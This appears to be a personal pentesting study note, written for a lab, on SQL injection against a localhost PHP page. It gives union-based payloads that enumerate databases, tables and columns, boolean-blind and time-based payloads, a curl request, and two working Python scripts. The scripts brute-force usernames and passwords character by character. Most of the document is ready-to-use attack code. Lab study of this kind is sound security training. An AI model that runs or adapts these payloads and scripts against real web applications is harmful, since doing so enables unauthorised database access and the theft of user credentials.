
# Definition

Is a web security vulnerability that allows an attacker to interfere with the query that a applications make to a database

-----

# Steps

1. You have to find the numbers of columns

> 'order by 1-- -

2. You can play with union select
If you want to see the output you have to put a invented result in vulnerable field, like id=12312323

> 'union select 1,2,3... (put something for each column)

3. See the databases

> select schema_name from information_schema.schemata-- - 

If you only can see one database you can play with limit:

> 'union select schema_name from information_schema.schemata limit 0,1-- - (you change the first number, e.x --> 0,1,2,3...)


Other form is playing with union_concat() function that represent all separated with quotes

> searchUsers.php?id=123'union select group_concat( schema_name) from information_schema.schemata-- -

4. To see the tables

> ?id=123'union select group_concat( table_name) from information_schema.tables where table_schema='Hack4u'-- -

5. Enum columns

> ?id=123'union select group_concat( column_name) from information_schema.columns where table_schema='Hack4u' AND table_name='users'-- -

6. 

---


# Types of SQLI

## SQLI based in error

## Boolean-based blind SQL Injection

Check character a character to see what is the correct

> select (select substring(username, 1,1) from users where id = 1)='a';

If the first character is true they **return the number 1** else **return 0**

If the '' are parsed you can convert the query to decimal

> select(select ascii(substring(username,1,1)) from users where id = 1)=97;

97 in ascii is the character **a**

You can use curl command:

> curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select (select ascii(substring(username,1,1)) from users where id = 1) = 97)"

### Script in python3 to obtain a user

````python
#!/usr/bin/python3

# Para hacer solicitudes
import requests

# This allow to do Ctrl+C and take the signal
import signal

import sys

import time

# Para jugar con las funciones de barras de progreso
from pwn import *

# To play with characters
import string

# Ctrl+c
def def_handler(sig, frame):
    print("\n\n [*] Saliendo... [*]")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://localhost/searchUsers.php"
characters = string.printable


def makeSQLI():

    p1 = log.progress("Brute Force")
    p1.status("Start brute force processing")

    time.sleep(2)

    p2 = log.progress("Extracted data")

    extracted_info = ""

    for position in range(1, 50):
        for character in range(33,126):
            sqli_url = main_url + "?id=9 or (select (select ascii(substring(username,%d,1)) from users where id = 1) = %d)" % (position, character)

            p1.status(sqli_url)

            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                
                p2.status(extracted_info)

                break

if __name__ == '__main__':

    makeSQLI()

          
````


### Script to obtain all the user
You only have to change the SQL query
````sql
select (select ascii(substring((select group_concat(username) from users), %d,1)) from users where id = 1) = %d
````

The output is all the users

## Based in time

If the first character of the used database is H, sleep 5 seconds

We can use ascii because exists some restriction and can put ( ' ) because they escape `\'` 

````sql
select * from users where id = 1 and if(ascii(substr(database(),1,1))=72,sleep(5),1);
````

We can automate this with an script:

````python
#!/usr/bin/python3

# Para hacer solicitudes
import requests

# This allow to do Ctrl+C and take the signal
import signal

import sys

import time

# Para jugar con las funciones de barras de progreso
from pwn import *

# To play with characters
import string

# Ctrl+c
def def_handler(sig, frame):
    print("\n\n [*] Saliendo... [*]")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://localhost/searchUsers.php"
characters = string.printable


def makeSQLI():

    p1 = log.progress("Brute Force")
    p1.status("Start brute force processing")

    time.sleep(2)

    p2 = log.progress("Extracted data")

    extracted_info = ""

    for position in range(1, 150):
        for character in range(33,126):
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d, sleep(0.35),1)" % (position, character)

            p1.status(sqli_url)


            # take the actual time
            time_start = time.time()

            r = requests.get(sqli_url)

            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                
                p2.status(extracted_info)

                break

if __name__ == '__main__':

    makeSQLI()

````


-----

# Oracle
## How to know the name of the database in Oracle
````sql
'union select ora_database_name,NULL from dual-- -
````


----

# Tags

#sqli  #python #oracle #sql 

----